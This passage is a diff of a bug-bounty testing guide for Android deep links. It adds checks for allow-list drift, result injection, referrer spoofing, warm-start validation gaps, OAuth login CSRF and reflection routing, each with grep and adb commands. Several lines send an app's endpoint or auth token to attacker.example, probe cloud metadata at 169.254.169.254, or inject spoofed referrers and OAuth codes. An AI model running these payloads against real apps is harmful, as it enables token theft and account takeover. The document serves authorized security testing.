+  grep -rnE 'baseUrl\(|setEndpoint\(|HttpUrl\.parse|Retrofit\.Builder|\.host\(|BASE_URL|API_HOST|Environment\.' "$DEC/jadx/sources/" -B10 \
     | grep -nE 'getIntent|getQueryParameter|getStringExtra|SharedPreferences'
-  grep -rnE '"https?://[a-z0-9.-]*(staging|stg|qa|uat|dev|test|preprod|sandbox)[a-z0-9.-]*"' out/sources/ out/res/values/*.xml
+  grep -rnE '"https?://[a-z0-9.-]*(staging|stg|qa|uat|dev|test|preprod|sandbox)[a-z0-9.-]*"' "$DEC/jadx/sources/" "$DEC/apktool/res/values/"*.xml
   ```
   ```bash
   adb shell am start -a android.intent.action.VIEW -d "targetapp://config?env=staging" com.target.app
   adb shell am start -a android.intent.action.VIEW -d "targetapp://config?endpoint=https://attacker.example/api/" com.target.app
-  adb shell am start -a android.intent.action.VIEW -d "https://app.target.example/deeplink?debug=1&env=staging" com.target.app
+  adb -s "$SERIAL" shell -n am start -a android.intent.action.VIEW -d "'https://app.target.example/deeplink?debug=1&env=staging'" "$PKG"
   ```
 - **Proof:** The proxy showing a **different `Host` header** on subsequent requests, carrying the same
   `Authorization` token. If the switch reaches an attacker-named host, the token arrives at your listener. If
@@ -2844,7 +2945,7 @@ Decision:
   reaches, typically a localhost debug listener or an RFC1918 host on the user's network.
 - **How:**
   ```bash
-  grep -rnE 'getQueryParameter\("(endpoint|callback|webhook|import|fetch|src|image_url|avatar|sync)"\)' out/sources/ -A15 \
+  grep -rnE 'getQueryParameter\("(endpoint|callback|webhook|import|fetch|src|image_url|avatar|sync)"\)' "$DEC/jadx/sources/" -A15 \
     | grep -nE 'OkHttp|HttpURLConnection|Retrofit|Glide|Picasso|load\(|enqueue\('
   adb shell am start -a android.intent.action.VIEW -d "targetapp://sync?endpoint=http://127.0.0.1:8080/" com.target.app
   adb shell am start -a android.intent.action.VIEW -d "targetapp://import?src=http://169.254.169.254/latest/meta-data/" com.target.app
@@ -2880,7 +2981,7 @@ Decision:
   ```bash
   M="zq7x4k2m"                                   # random, 8 chars, no dictionary word
   adb logcat -c
-  grep -r "$M" out/sources/ && echo "MARKER COLLIDES WITH APP CODE - pick another"
+  grep -r "$M" "$DEC/jadx/sources/" && echo "MARKER COLLIDES WITH APP CODE - pick another"
   adb shell am start -a android.intent.action.VIEW -d "https://app.target.example/magic?token=$M" com.target.app
   adb logcat -d | grep -F "$M"
   adb shell dumpsys activity activities | grep -F "$M"
@@ -2942,14 +3043,15 @@ Decision:
 | **Requires** | backend-api, mitm |
 | **Maps to** | the bug-hunting corpus's shadow-API method — "a mobile app's hardcoded backend calls are frequently an OLDER API version than the current web app uses, with weaker auth, weaker rate limits, weaker input validation and more field exposure. Diff **behaviourally** across versions, not by response shape" |
 
+| **Record** | logs/D09-074.txt (the behavioural diff per endpoint), logs/D09-074-endpoints.txt, requests/E-NNN.http |
 - **Test:** This is the highest-value structural idea for a mobile engagement, and the deep-link router is the
   cheapest place to harvest the endpoint list because each route names its call. Take every endpoint a route
   reaches and diff its *behaviour* against the version the current web app uses.
 - **How:**
   ```bash
   # harvest from the routes you traced in D09-041 (Retrofit annotation VALUES survive R8)
-  grep -rnE '@(GET|POST|PUT|DELETE|PATCH)\("' out/sources/ | sed 's/.*("\([^"]*\)").*/\1/' | sort -u > /tmp/endpoints.txt
-  wc -l /tmp/endpoints.txt
+  grep -rnE '@(GET|POST|PUT|DELETE|PATCH)\("' "$DEC/jadx/sources/" | sed 's/.*("\([^"]*\)").*/\1/' | sort -u > "$E/logs/D09-074-endpoints.txt"
+  wc -l "$E/logs/D09-074-endpoints.txt"
   # probe sibling versions of the same operation
   for v in v1 v2 v3 beta alpha internal legacy old; do
     curl -s -o /dev/null -w "%{http_code} /api/$v/orders\n" "https://api.target.example/api/$v/orders"
@@ -2978,6 +3080,7 @@ Decision:
 | **VRT** | none — rating discipline that moves findings a whole band in both directions |
 | **Attacker** | n/a |
 | **Applies to** | every deep-link finding |
+| **Requires** | — |
 | **Maps to** | the corpus's severity-discipline lesson (the Looker bounding case); the pre-severity gate's question 4 ("Is there an inheritance gate, signature check, audience check, or other validation still gating the chain?") |
 
 - **Test:** A weak native shell can still be defanged by the framework or server layer. Unvalidated raw-URI
@@ -2990,9 +3093,9 @@ Decision:
   # Dart
   strings -8 lib/arm64-v8a/libapp.so | grep -iE 'allowedHost|isAllowed|instanceHostname|sandbox|getAuthenticatedEmbedUrl'
   # JS
-  grep -aiE 'allowedHosts|isTrusted|sanitizeUrl|assertOrigin' /tmp/hbc.strings
+  grep -aiE 'allowedHosts|isTrusted|sanitizeUrl|assertOrigin' "$E/logs/D09-010-bundle.js"     # the decoded Hermes bundle from D09-010
   # Java/Kotlin second gate
-  grep -rn 'shouldOverrideUrlLoading\|onPageStarted' out/sources/ -A20 | grep -nE 'host|allow|equals\('
+  grep -rn 'shouldOverrideUrlLoading\|onPageStarted' "$DEC/jadx/sources/" -A20 | grep -nE 'host|allow|equals\('
   ```
 - **Proof:** The second validation layer quoted in the finding, with the sentence that states what it prevents.
   Then rate against the *demonstrated* downstream behaviour, not the primitive.
@@ -3008,6 +3111,7 @@ Decision:
 | **VRT** | none — the evidence rule that decides the attacker model on every finding |
 | **Attacker** | AM-02 / AM-03 (this item is how you establish which) |
 | **Applies to** | every finding in this chapter |
+| **Requires** | — |
 | **Maps to** | repository doctrine (`docs/05-attacker-models.md`: "Report the weakest attacker that still works"); `tools/07-deeplink-sweep.sh`; Google Mobile VRP interaction tiers |
 
 - **Test:** `adb shell am start` runs as `shell`, a UID with far more privilege than any attacker in the
@@ -3019,14 +3123,24 @@ Decision:
   # AM-03: the probe app declares NO permissions - that manifest is the evidence
   sed -n '1,30p' attacker-app/app/src/main/AndroidManifest.xml       # screenshot the empty permission block
   ./gradlew :app:assembleDebug && adb install -r attacker-app/app/build/outputs/apk/debug/app-debug.apk
-  # fire from the probe, not from shell
-  adb shell am start -n com.sanehunters.probe/.MainActivity --es target "targetapp://route?x=1"
-  # AM-02: from a real page in the default browser (D09-007)
-  adb shell am start -a android.intent.action.VIEW -d http://127.0.0.1:8000/d09.html -p com.android.chrome
-  adb logcat -d -s ActivityTaskManager | grep -i 'START u0.*com.target.app' | tail -5
+  # fire from the probe, not from shell. `deeplink` = implicit VIEW exactly as a browser sends it (BROWSABLE added):
+  adb -s "$SERIAL" shell -n am start -n com.sanehunters.probe/.MainActivity --es run deeplink --es deeplink "'targetapp://route?x=1'"
+  # non-BROWSABLE implicit VIEW (a filter without BROWSABLE, an NDEF or SEND filter): the `start` step, browsable=false
+  adb -s "$SERIAL" shell -n am start -n com.sanehunters.probe/.MainActivity --es run start --es action android.intent.action.VIEW --es data "'targetapp://route?x=1'" --ez browsable false
+  # explicit component + typed extras, result captured (extras-forwarding and resume routes: D09-062, D09-082)
+  adb -s "$SERIAL" shell -n am start -n com.sanehunters.probe/.MainActivity --es run start --es component "$PKG/<Activity>" --es data "'https://…'" --es extras "'EXTRA_REDIRECT_URL:s=https://attacker.example'" --ez forresult true
+  adb -s "$SERIAL" logcat -s PROBE:V        # PROBE|start|… and PROBE|result|resultCode=…
+  # AM-02: run D09-007 (the four HTML delivery forms) and attach its `ActivityTaskManager: START u0` line here
   ```
+  The `deeplink` step always adds `CATEGORY_BROWSABLE` and uses `startActivity`; anything else — a
+  non-BROWSABLE filter, typed extras, `startActivityForResult` — is the `start` step. On targetSdk ≥ 30 the
+  probe's `queryIntentActivities`/`resolveActivity` only see the packages its `<queries>` declares, so a
+  "no handler" from the probe is a visibility artefact, not a negative: resolve with
+  `adb -s "$SERIAL" shell -n pm query-activities` and prove reachability by launching, which package visibility
+  does not filter.
 - **Proof:** Three artefacts per finding: the probe app's permission-free manifest, the `ActivityTaskManager:
-  START` line naming the **caller package** (probe or browser, never `shell`), and a screen recording. If only
+  START` line naming the **caller package** (probe or browser, never `shell`), and a screen recording. The
+  browser half is D09-007's artefact — attach it, do not re-derive it here. If only
   the adb path works, say so and rate the finding as unproven rather than inventing an attacker.
 - **Escalation:** Moving a finding from AM-03 to AM-02 is the single highest-value PoC decision in mobile bug
   bounty — at Google VRP Tier 1 it is the difference between $15,000 and $150,000. Always attempt the page
@@ -3041,6 +3155,7 @@ Decision:
 | **VRT** | none — kill gate that prevents a false Critical |
 | **Attacker** | n/a |
 | **Applies to** | every interception finding whose impact claim is "and the token works" |
+| **Requires** | — |
 | **Maps to** | the bug-hunting corpus's **LAYER-ORDERING TRAP** — "the highest-confidence false positive in the entire auth-bypass class" |
 
 - **Test:** You intercepted a token (D09-026 → D09-031) and replayed it, and the API answered
@@ -3077,9 +3192,10 @@ Decision:
 | **VRT** | none — the discipline that keeps your validity ratio |
 | **Attacker** | n/a |
 | **Applies to** | every bypass, reflection and timing claim in this chapter |
+| **Requires** | — |
 | **Maps to** | the bug-hunting corpus's **Marker Discipline**, **Body-Diff Rule**, **Statistical-Sample Rule**, **Server-Policy-vs-State** and **Shell-Loop Ban** |
 
-- **Test:** Four specific ways a deep-link finding turns out to be nothing, and the control for each.
+- **Test:** Six specific ways a deep-link finding turns out to be nothing, and the control for each.
   1. **Marker collision.** Your "reflected" parameter was already in the baseline. Use an 8+ character random
      alphanumeric marker with no English word, no protocol keyword, and no dictionary token — never `test`,
      `evil`, `attacker`, `payload`, `javascript`, `AAAA`, or your own domain — and **search the baseline
@@ -3088,15 +3204,24 @@ Decision:
   3. **Server policy mistaken for state.** A route that always rejects a scheme is not an oracle about your
      input.
   4. **Silent shell loops.** zsh array expansion fails silently and produces zero iterations with no error.
+  5. **Stdin-eating loops and device-shell quoting.** `adb shell` inside a `while read` loop reads the loop's own
+     stdin: the loop ends after one row with no error. Every `adb shell` inside a loop takes `-n` (do not read
+     stdin); every `read` takes `-r` (backslashes in payloads survive); never `for u in $(cat file)` — a `*` from
+     a `pathPattern` row globs against the working directory. Every value that reaches the device shell is
+     single-quoted a second time (`-d "'<uri>'"`): `&`, `;`, `(`, `|`, `$` and spaces otherwise end the command
+     on the device with no error on the host. Always print `fired N / M` at the end.
+  6. **Device-state drift.** Record per-device flag/config state before settling any deep-link or auth negative
+     (D09-081): a route or allow-list entry that is flag-OFF on the emulator can be ON on the production device
+     class, and the reverse.
 - **How:**
   ```bash
   M=$(head -c16 /dev/urandom | base64 | tr -dc 'a-z0-9' | head -c10)
-  curl -s "https://target.example/route" > /tmp/base.html
-  grep -F "$M" /tmp/base.html && echo "MARKER ALREADY IN BASELINE - pick another"
+  curl -s "https://target.example/route" > "$E/logs/D09-078-baseline.html"
+  grep -F "$M" "$E/logs/D09-078-baseline.html" && echo "MARKER ALREADY IN BASELINE - pick another"
   # body diff, not status diff
   diff <(curl -s "https://target.example/x") <(curl -s "https://target.example/x?bypass=1") | head
   # count your sweep results (see D09-013) - always
-  wc -l uris.txt /tmp/d09_sweep.txt
+  wc -l uris.txt "$E/logs/D09-013.txt"
   ```
   For any rate-limit or timing claim arising from a deep-link flow (for example "the magic-link endpoint has
   no throttle"), use **n ≥ 10 interleaved trials per group**, randomised order, and require the suspect
@@ -3115,6 +3240,7 @@ Decision:
 | **VRT** | none — submission quality |
 | **Attacker** | n/a |
 | **Applies to** | every finding in this chapter |
+| **Requires** | — |
 | **Maps to** | the bug-hunting corpus's `evidence-hygiene` §§2, 4–8 (five-screenshot pattern, HAR sanitising, the PII split); repository `docs/04-poc-and-evidence-standard.md` |
 
 - **Test:** A deep-link ATO is a state change, and a state change needs five artefacts, not one. And because
@@ -3159,6 +3285,7 @@ Decision:
 | **VRT** | none — the item that decides whether the chapter's work converts into paid findings |
 | **Attacker** | n/a |
 | **Applies to** | every finding in this chapter |
+| **Requires** | — |
 | **Maps to** | the bug-hunting corpus's PRE-SEVERITY GATE, retraction discipline, and chain-filing order (`bugcrowd-reporting` §5, §8); Starbucks out-of-scope wording; Google Mobile VRP interaction tiers; Reddit's `autoVerify` exclusion; Grab's third-party-tool exclusion |
 
 - **Test:** Three gates, in order, before you submit anything from this chapter: scope, the pre-severity
@@ -3199,6 +3326,248 @@ Decision:
   whether you hold pre-patch evidence.
 - **Ruled out when:** n/a — run these gates on every finding before submission.
 
+### D09-081 · Server-delivered allow-lists and flag-gated routes differ per device — dump the live state, never rate from the emulator
+
+| | |
+|---|---|
+| **Severity ceiling** | Support (it re-rates every allow-list and route finding in this chapter) |
+| **VRT** | none — evidence rule; the finding it uncovers takes D09-057's or D09-059's node |
+| **Attacker** | n/a |
+| **Applies to** | apps with remote config, experiment flags or a server-pushed allow-list for WebView hosts or routes |
+| **Requires** | deeplink, device, mitm |
+| **Maps to** | MASTG-TEST-0394 (validation of deep-link input); MASTG-BEST-0071 |
+| **Record** | logs/D09-081.txt (per-device dump and the diff), `inventory/deeplinks.csv` notes column = flag/config key per route |
+
+- **Skip when:** `grep -rlE 'RemoteConfig|FeatureFlag|Experiment|getFlag\(' "$DEC/jadx/sources" | grep -viE '/(android|androidx|kotlin)/' | wc -l` is 0 **and** every allow-list is a compiled constant with no override path — write `n/a — no remote-config/flag store and no server-delivered allow-list (D09-081 skip grep = 0)`.
+- **Test:** The compiled default (a `strings.xml` entry, a constant array, `BuildConfig`) is replaced at runtime
+  by a list the server delivers per device, account, region or release channel. A wildcard entry, or a route that
+  is flag-ON only on the production device class, is invisible on the emulator — and the reverse. Decide every
+  allow-list and route item on the **most permissive live list observed on a production-channel device**, and
+  write which device decided it.
+- **How:**
+  ```bash
+  grep -rnE 'allowedHosts|allowlist|whitelist|trustedDomains|allowed_urls' "$DEC/jadx/sources" "$DEC/apktool/res/values" | grep -viE '/(android|androidx|kotlin)/' | head -30   # the compiled default
+  grep -rlE 'RemoteConfig|FeatureFlag|Experiment|getFlag\(|getBoolean\("|getString\("' "$DEC/jadx/sources" | grep -viE '/(android|androidx|kotlin)/' | head        # the override path
+  # the store (debuggable build or rooted device): where the live value lands
+  adb -s "$SERIAL" shell -n "run-as $PKG ls -R files shared_prefs databases 2>/dev/null" | grep -iE 'config|flag|experiment|remote'
+  # with Frida: hook the lookup you found and print the list it compares against (one line per device);
+  # without Frida: fire the same probe set (control URL, one off-host URL, one sibling-path URL) on every device and record accept/reject — an oracle
+  diff <(sort "$E/logs/D09-081-compiled.txt") <(sort "$E/logs/D09-081-live-<device>.txt") | tee -a "$E/logs/D09-081.txt"
+  ```
+- **Proof:** A per-device table — entry · compiled default · device A live · device B live · config key — and the
+  negative or finding naming the device whose list it was decided on.
+- **Escalation:** A wildcard entry in the live list → D09-057; a flag-only route → a D09-041 table row with its
+  `gate` column filled; an unauthenticated or unpinned config endpoint → D14 / D18.
+- **Ruled out when:** The live list equals the compiled default on every test device and is not keyed by
+  account, region or channel (quote the fetch code), or no override path exists. Paste the diff.
+
+### D09-082 · Result injection into an in-flight flow: a resume/callback route gated only by saved state
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) → the business-logic consequence when the injected result completes a purchase, auth or KYC step |
+| **Attacker** | AM-03 (explicit intent with typed extras from the probe); AM-02 when the resume route is BROWSABLE |
+| **Applies to** | apps that hand off to a Custom Tab, browser, payment app or SDK and resume through a route |
+| **Requires** | deeplink, exported-activity, device |
+| **Maps to** | MASTG-TEST-0375 (Missing Validation of Data Returned from Implicit Intents); MASWE-0018; D08-033 (the result-relay variant: `onActivityResult` echoed into `setResult`) |
+| **Record** | logs/D09-082.txt, screenshots/D09-082-<n>.png, requests/E-NNN.http |
+
+- **Skip when:** `grep -rlE 'CustomTabsIntent|launchUrl\(|startActivityForResult|registerForActivityResult' "$DEC/jadx/sources" | grep -viE '/(android|androidx)/' | wc -l` is 0 and no route key contains `continue|resume|callback|return` — write `n/a — no external hand-off and no resume route (D09-082 skip grep = 0)`.
+- **Test:** A flow leaves the app and persists "in progress" (a preference, a static flag). The resume route
+  (`…/continue`, `…/resume`, `…/callback`) checks only that flag — not who fired it — then acts on the incoming
+  extras or returns `setResult(RESULT_OK, attackerIntent)` to its own caller. D09-061 is a redirect after a
+  check and D09-066 an action with no confirmation; here the route is legitimate and the **source of the result**
+  is unverified.
+- **How:**
+  ```bash
+  grep -rlE 'continue|resume|callback|onReturn|handleResult' "$DEC/jadx/sources" | xargs grep -lE 'getIntent\(\)|onNewIntent' | grep -viE '/(android|androidx)/' | head
+  grep -rnE 'setResult\(|RESULT_OK' "$DEC/jadx/sources" -B8 | grep -nE 'getIntent|getExtras|getData|getStringExtra'
+  grep -rnE 'CustomTabsIntent|launchUrl\(|_launched|in_progress|flowState|pendingFlow' "$DEC/jadx/sources" | head
+  # 1. start the real flow and leave the external step open (the Custom Tab, the payment app)
+  # 2. from the probe's `start` step (explicit component, typed extras, startActivityForResult) fire the resume route with your own result
+  adb -s "$SERIAL" shell -n am start -n com.sanehunters.probe/.MainActivity --es run start --es component "$PKG/<ResumeActivity>" --es extras "'status:s=success;order_id:s=<yours>;amount:i=1'" --ez forresult true
+  adb -s "$SERIAL" logcat -s PROBE:V | tee "$E/logs/D09-082.txt"       # PROBE|start|… and PROBE|result|resultCode=…
+  # 3. the control: the same launch with NO flow in progress
+  ```
+- **Proof:** The app completing the in-flight step on the attacker's extras (the commit/confirm request in the
+  proxy, or `PROBE|result|resultCode=-1` carrying relayed extras) **while the same route fired with no flow in
+  progress is refused** — that contrast proves the gate is state, not caller.
+- **Escalation:** → D23 (purchase, credit); → D13 (auth or KYC step); → D08-033 when `onActivityResult` is
+  relayed into `setResult` (grant flags re-issued from the app's UID).
+- **Ruled out when:** The resume route verifies the caller — `getCallingPackage()`/`getCallingActivity()`
+  against an allow-list, or a nonce minted at flow start and checked on resume — quote the check and show the
+  probe refused.
+
+### D09-083 · Trust decisions on `Activity.getReferrer()`, `EXTRA_REFERRER` or `Browser.EXTRA_APPLICATION_ID`
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies); `broken_authentication_and_session_management.authentication_bypass` (P1) when the trusted branch skips an auth gate |
+| **Attacker** | AM-02 (an `intent://` link carrying `S.android.intent.extra.REFERRER_NAME`); AM-03 |
+| **Applies to** | routers that branch on the referrer or the calling package |
+| **Requires** | deeplink |
+| **Maps to** | Android `Activity.getReferrer()` reference ("this is not a security mechanism … applications can spoof it"); MASTG-KNOW-0019 (no mechanism identifies which app sent an Intent) |
+| **Record** | logs/D09-083.txt, screenshots/D09-083-<n>.png |
+
+- **Skip when:** `grep -rlE 'getReferrer\(\)|EXTRA_REFERRER|EXTRA_APPLICATION_ID' "$DEC/jadx/sources" | grep -viE '/(android|androidx)/' | wc -l` is 0 — write `n/a — no referrer-based branch (D09-083 skip grep = 0)`.
+- **Test:** `getReferrer()` returns whatever `EXTRA_REFERRER`/`EXTRA_REFERRER_NAME` the caller set, else
+  `android-app://<caller>`; browsers set it to the page URL. A router that unlocks a "came from our site / our
+  other app" route set on it is unlocked by anyone. Only `getCallingPackage()`/`getCallingActivity()` (populated
+  for `startActivityForResult` callers) are spoof-resistant.
+- **How:**
+  ```bash
+  grep -rnE 'getReferrer\(\)|EXTRA_REFERRER|EXTRA_APPLICATION_ID|getCallingPackage\(\)|getCallingActivity\(\)' "$DEC/jadx/sources" | grep -viE '/(android|androidx)/' | tee "$E/logs/D09-083.txt"
+  # from a page (D09-007 harness):
+  #   <a href="intent://route?x=1#Intent;scheme=targetapp;package=$PKG;S.android.intent.extra.REFERRER_NAME=https%3A%2F%2Ftrusted.example%2F;end">go</a>
+  # from the probe:
+  adb -s "$SERIAL" shell -n am start -n com.sanehunters.probe/.MainActivity --es run start --es action android.intent.action.VIEW --es data "'targetapp://route?x=1'" --es extras "'android.intent.extra.REFERRER_NAME:s=https://trusted.example/'"
+  ```
+  Hook `android.app.Activity.getReferrer` and print its return value next to the branch taken.
+- **Proof:** The trusted branch running with a spoofed referrer **and** the same URI without it refused; quote the
+  predicate.
+- **Escalation:** → D09-066 / D09-067 for what the unlocked branch does; recommend `getCallingPackage()` plus a
+  signature check, or a server-minted nonce.
+- **Ruled out when:** No referrer-based branch exists, or the branch grants nothing the untrusted branch cannot
+  — enumerate both route sets and paste them.
+
+### D09-084 · Warm delivery: `onNewIntent` versus `onCreate` validation asymmetry on single-task routers
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) → the sink's node |
+| **Attacker** | AM-02 |
+| **Applies to** | routers with `launchMode` singleTask / singleTop / singleInstance, or launched with `FLAG_ACTIVITY_SINGLE_TOP` / `CLEAR_TOP` |
+| **Requires** | deeplink, device |
+| **Maps to** | Android `Activity.onNewIntent()` reference (`getIntent()` keeps the original intent unless `setIntent()` is called); MASTG-TEST-0394; MASTG-BEST-0071 |
+| **Record** | logs/D09-084.txt (cold/warm sweep), screenshots/D09-084-<n>.png |
+
+- **Skip when:** `grep -cE 'launchMode="(singleTask|singleTop|singleInstance)"' "$DEC/apktool/AndroidManifest.xml"` is 0 **and** `grep -rl 'onNewIntent' "$DEC/jadx/sources" | grep -viE '/(android|androidx)/' | wc -l` is 0 — write `n/a — every router is standard launchMode with no onNewIntent (D09-084 skip greps = 0/0)`.
+- **Test:** Two entry methods, one validator. `onCreate` runs the check on a cold start; the second link arrives in
+  `onNewIntent`, which frequently skips it, re-reads a stale `getIntent()` (no `setIntent()`), and executes with
+  the post-login state that cold-start gating relied on. Fire every route twice — cold (`am force-stop` first)
+  and warm (router already resumed, user logged in) — and diff. Look for the inverse too: `onNewIntent`
+  validates but the handler re-reads the stale `getIntent()`.
+- **How:**
+  ```bash
+  grep -nE 'launchMode="(singleTask|singleTop|singleInstance)' -B2 "$DEC/apktool/AndroidManifest.xml"
+  grep -rn 'onNewIntent' "$DEC/jadx/sources" -A25 | grep -nE 'setIntent\(|<validator name>|getHost\(\)|isAllowed'
+  while IFS= read -r u; do
+    adb -s "$SERIAL" shell -n am force-stop "$PKG"
+    c=$(adb -s "$SERIAL" shell -n am start -W -a android.intent.action.VIEW -d "'$u'" "$PKG" | grep -Eo 'Status: [a-z]+')   # cold
+    w=$(adb -s "$SERIAL" shell -n am start -W -a android.intent.action.VIEW -d "'$u'" "$PKG" | grep -Eo 'Status: [a-z]+')   # warm (router on top)
+    top=$(adb -s "$SERIAL" shell -n dumpsys activity activities | grep -m1 -E 'ResumedActivity' | sed 's/.*u0 //;s/ .*//')
+    printf '%-60s cold=%s warm=%s top=%s\n' "$u" "$c" "$w" "$top"
+  done < routes.txt | tee "$E/logs/D09-084.txt"
+  echo "fired $(wc -l < "$E/logs/D09-084.txt") / $(wc -l < routes.txt)"
+  ```
+  Hook `onNewIntent` and `onCreate` of the router and print which validator ran.
+- **Proof:** A route accepted warm and refused cold (or the reverse), both `am start -W` outputs, and both handler
+  bodies quoted.
+- **Escalation:** → D09-059 / D09-066 by sink; → D04 when `taskAffinity` lets the attacker choose the task.
+- **Ruled out when:** Both paths call the same validator, `onNewIntent` calls `setIntent()`, and the cold/warm
+  sweep agrees on every route — paste both counts.
+
+### D09-085 · Login CSRF / forced account-linking through the redirect handler — `state` not bound to the app's own session
+
+| | |
+|---|---|
+| **Severity ceiling** | Critical |
+| **VRT** | `server_security_misconfiguration.oauth_misconfiguration.account_takeover` (P2) when the linked identity grants access to the victim's account; `server_security_misconfiguration.oauth_misconfiguration.missing_state_parameter` (varies) for the unchecked `state` alone |
+| **Attacker** | AM-02 |
+| **Applies to** | apps with an OAuth/OIDC redirect handler, social login or "link account" flows |
+| **Requires** | oauth, deeplink, two-accounts |
+| **Maps to** | RFC 6819 §4.4.1.8 (CSRF attack against redirect-uri); OAuth 2.0 Security Best Current Practice (CSRF protection, `state`/PKCE binding); MASWE-0018 |
+| **Record** | logs/D09-085.txt, screenshots/D09-085-{1..5}.png, requests/E-NNN.http |
+
+- **Skip when:** the D09-028 inventory finds no authorization-code redirect handler — write `n/a — no OAuth/OIDC redirect route (D09-028)`.
+- **Test:** D09-028 steals the victim's code; this is the inverse. Obtain an authorization code for **your**
+  account (intercept your own flow, do not redeem it), then deliver `redirect?code=<yours>&state=<anything>` to
+  the victim's device from a page. If the handler does not compare `state` with a value it minted for this
+  device/session, the victim's app exchanges your code: the victim now acts inside your account (uploads,
+  payments and messages land where you can read them), or your provider identity is attached to the victim's
+  account — persistent access that survives a password change.
+- **How:**
+  ```bash
+  grep -rnE '"state"|getQueryParameter\("state"\)|AuthState|AuthorizationResponse\.fromIntent|nonce' "$DEC/jadx/sources" | grep -viE '/(android|androidx)/' | head | tee "$E/logs/D09-085.txt"
+  # capture your own /authorize round trip in the proxy and stop before the token exchange; keep code + state
+  # from a page on the victim device:  <a href="targetapp://oauth2redirect?code=<attacker-code>&state=<any>">open</a>
+  ```
+  Hook the handler's `state` comparison (or AppAuth `AuthorizationResponse`) and print expected versus received.
+- **Proof:** The five-screenshot pattern (D09-079): victim pre-state (own account), the link, the victim's app
+  showing **your** account (or your provider listed under the victim's linked accounts), the authenticated API
+  call proving which identity holds the session, and the same link with a wrong `state` refused (which proves the
+  check exists when it does).
+- **Escalation:** → D13 (persistent ATO via a linked identity); → D09-028 chain-filing (same handler, two fix
+  surfaces).
+- **Ruled out when:** `state` is random per request, stored device-side, compared on return and single-use
+  (quote all three), **and** account linking requires fresh re-authentication of the existing session.
+
+### D09-086 · A URI parameter names the class, fragment or screen to open — reflection routing
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) → D08's node when a non-exported component is reached |
+| **Attacker** | AM-02 |
+| **Applies to** | all |
+| **Requires** | deeplink |
+| **Maps to** | MASTG risk `intent-redirection`; MASTG-TEST-0394 |
+| **Record** | logs/D09-086.txt, screenshots/D09-086-<n>.png |
+
+- **Skip when:** `grep -rnE 'Class\.forName\(|setClassName\(|setComponent\(|instantiate\(|FragmentFactory|newInstance\(' "$DEC/jadx/sources" -B8 | grep -cE 'getQueryParameter|getPathSegments|getLastPathSegment|getStringExtra'` is 0 — write `n/a — no URI-derived value reaches a class/fragment instantiation (D09-086 skip grep = 0)`.
+- **Test:** The route key is used as a class name, fragment name or navigation destination id rather than looked
+  up in a fixed map. Any screen in the APK — debug panels, internal settings, non-exported activities — becomes
+  link-reachable with no `parseUri` anywhere (that variant is D09-065).
+- **How:**
+  ```bash
+  grep -rnE 'Class\.forName\(|setClassName\(|setComponent\(|instantiate\(|FragmentFactory|newInstance\(|navigate\(' "$DEC/jadx/sources" -B8 | grep -nE 'getQueryParameter|getPathSegments|getLastPathSegment|getStringExtra' | tee "$E/logs/D09-086.txt"
+  adb -s "$SERIAL" shell -n am start -W -a android.intent.action.VIEW -d "'targetapp://open?screen=<non-exported activity class>'" "$PKG"
+  adb -s "$SERIAL" shell -n am start -W -a android.intent.action.VIEW -d "'targetapp://open?fragment=<internal fragment class>&id=1'" "$PKG"
+  adb -s "$SERIAL" shell -n dumpsys activity activities | grep -m1 -E 'ResumedActivity'
+  ```
+- **Proof:** A non-exported activity or internal fragment resumed from a URI that names it, with the reflection
+  line quoted; delivered from a page for AM-02 (D09-007).
+- **Escalation:** → D08 (component launch with attacker extras); → D09-067 (the reached screen assumes login).
+- **Ruled out when:** The key goes through a fixed map or enum and unknown keys fall to a default screen — quote
+  the map and show an unknown key landing on the default.
+
+### D09-087 · Jetpack Navigation implicit deep links: `<nav-graph>` expansion, placeholders and start-destination bypass
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) → D09-067's or D09-068's node |
+| **Attacker** | AM-02 |
+| **Applies to** | apps using `androidx.navigation` (XML graphs or Compose `navDeepLink`) |
+| **Requires** | deeplink |
+| **Maps to** | Android Navigation guide, "Create a deep link for a destination" (implicit deep links generate the intent filters; `{placeholder}` and `.*`; `handleDeepLink` builds a synthetic back stack); MASTG-TECH-0172 |
+| **Record** | logs/D09-087.txt (destination table), screenshots/D09-087-<n>.png |
+
+- **Skip when:** `grep -c 'nav-graph' "$DEC/apktool/AndroidManifest.xml"` is 0 **and** `grep -rlE 'navDeepLink|NavDeepLink' "$DEC/jadx/sources" | grep -viE '/(android|androidx)/' | wc -l` is 0 — write `n/a — no Navigation-component deep links (D09-087 skip greps = 0/0)`.
+- **Test:** The manifest shows the generated filters but not which destination each `app:uri` opens; `{arg}`
+  placeholders match one path segment of any content, `.*` matches anything, and the destination is created
+  **without** passing through the start destination (where the login or onboarding gate usually sits). Build
+  the destination table and cold-fire each row.
+- **How:**
+  ```bash
+  grep -rn -B3 -A3 '<deepLink' "$DEC/apktool/res/navigation/" | tee "$E/logs/D09-087.txt"              # XML graphs
+  grep -rnE 'navDeepLink|NavDeepLink\.Builder|uriPattern|deepLink \{' "$DEC/jadx/sources" | head         # Compose / Kotlin DSL
+  grep -n 'nav-graph' "$DEC/apktool/AndroidManifest.xml"                                                 # confirms build-time expansion
+  # per destination: fire cold, with a placeholder of the wrong type, and with another user's identifier
+  adb -s "$SERIAL" shell -n am force-stop "$PKG"; adb -s "$SERIAL" shell -n am start -W -a android.intent.action.VIEW -d "'https://target.example/order/<userB-id>'" "$PKG"
+  adb -s "$SERIAL" shell -n am start -W -a android.intent.action.VIEW -d "'https://target.example/order/notanumber'" "$PKG"; adb -s "$SERIAL" logcat -d -b crash | grep -A5 'FATAL'
+  ```
+- **Proof:** The destination table (uri pattern · destination · args · typed? · auth check in the destination?)
+  and one destination behind login rendered cold; or an `{id}` argument accepted for another user's object
+  (→ D09-068).
+- **Escalation:** → D09-067 (cold reach); → D09-068 (identifier arguments); → D09-073 (`argType` crash and
+  session loss).
+- **Ruled out when:** Every deep-linked destination re-checks the session itself, arguments carry `app:argType`,
+  and no `.*` wildcard admits attacker content — paste the table.
+
 ## Graveyard for this domain
 
